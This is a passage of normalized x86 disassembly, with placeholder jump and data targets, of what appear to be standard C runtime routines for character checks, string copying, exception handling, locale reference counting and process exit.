jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10014868
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1001cc5c
mov [ esi + 0x4 ] eax
sub_1001383f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_1001d119
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10013890
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001383f
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_100138be
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_1001d119
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001390f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100138be
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_1001393d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1001d119
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001398e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001393d
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_100139c0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_100139d0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_10013ab8
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_10013ae8
mov edi edi
push ebp
mov ebp esp
call sub_10018dad
push [ ebp + 0x8 ]
call sub_10018c02
push [ rw-data ]
call sub_100179d0
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_10013b11
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_10013b66
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_10013b83
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10013ba7
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_1001d1d1
push r--data
push r--data
call sub_10013b83
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_1001d290
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_10018739
call sub_1001457c
mov eax r--data
mov [ esp ] r--data
call sub_10013b66
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_1001d290
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_10013c2c
push 0x18
push r--data
call sub_10018984
push 0x8
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013d43
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_100189c9
retn
mov [ rw-data ] ebx
push 0x8
call sub_1001a3b0
pop ecx
push [ ebp + 0x8 ]
call sub_10013b3c
push r--data
mov eax r--data
call sub_10013b66
pop ecx
push [ rw-data ]
call sub_100179d0
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_10013b66
pop ecx
push [ rw-data ]
call sub_100179d0
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_100179c7
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_100179d0
mov edi eax
call sub_100179c7
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_100179d0
mov edi eax
push [ rw-data ]
call sub_100179d0
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_10013d93
mov edi edi
push esi
call sub_100179c7
mov esi eax
push esi
call sub_10017fd0
push esi
call sub_1001d603
push esi
call sub_10010a35
push esi
call sub_10018f65
push esi
call sub_1001d5f4
push esi
call sub_1001d3e2
push esi
call sub_1000102d
push esi
call sub_1001d3d1
push sub_10013d6e
call sub_10017955
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_10013de1
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10013e2d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_10013e66
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10013eba
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100162df
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_10013ef0
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_10010789
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_100162df
add esp 0x20
pop esi
pop ebp
retn
sub_10013f23
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_10013ffa
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_10017c1c
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_10013ffa
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10010789
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_100162df
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_10013f23
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10013e66
pop ebx
leave
retn
sub_10014099
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_1001d399
call sub_1001d399
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_1001410e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_10017c1c
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_10017c1c
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_1001413a
mov edi edi
push ebp
mov ebp esp
call sub_10017c1c
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_10014161
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10017c1c
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_10017c1c
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_10017c1c
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_1001d399
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_100141b3
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_10013ef0
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1001d680
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_10014213
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10014246
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1001427c
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100142b2
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1001431d
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_1001d437
test eax eax
je r-xdata
push 0xa
call sub_10018c02
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1001d444
pop ecx
push 0x3
call sub_10013d6e
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_10011a90
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_10014434
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_10014455
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_100179d0
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_100179d0
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_1001d6cc
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_10017955
mov [ esi ] eax
add esi 0x4
push esi
call sub_10017955
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1001673a
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1001673a
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_10017955
pop ecx
mov [ rw-data ] eax
sub_1001450f
mov edi edi
push esi
push 0x4
push 0x20
call sub_100166ee
mov esi eax
push esi
call sub_10017955
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10014540
push 0xc
push r--data
call sub_10018984
call sub_10013b54
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10014455
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10014576
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
sub_10014593
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10011c31
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10011c31
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10011c31
push [ esi + 0xc0 ]
call sub_10011c31
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_1001db8a
push [ edi ]
call sub_10011c31
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_10011c31
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10011c31
pop ecx
push [ esi + 0xb0 ]
call sub_10011c31
push [ esi + 0xbc ]
call sub_10011c31
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10011c31
push [ esi + 0xbc ]
call sub_1001dfa7
pop ecx
pop ecx
push eax
call sub_10011c31
pop ecx
push eax
call sub_10011c31
push [ esi + 0xbc ]
call sub_1001dd98
pop ecx
pop ecx
sub_100146dc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1001476b
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_10014804
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_100146dc
pop ecx
pop edi
sub_1001482a
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_100146dc
pop ecx
test esi esi
je r-xdata
push esi
call sub_1001476b
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_10014593
pop ecx
sub_10014868
push 0xc
push r--data
call sub_10018984
call sub_10017c1c
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
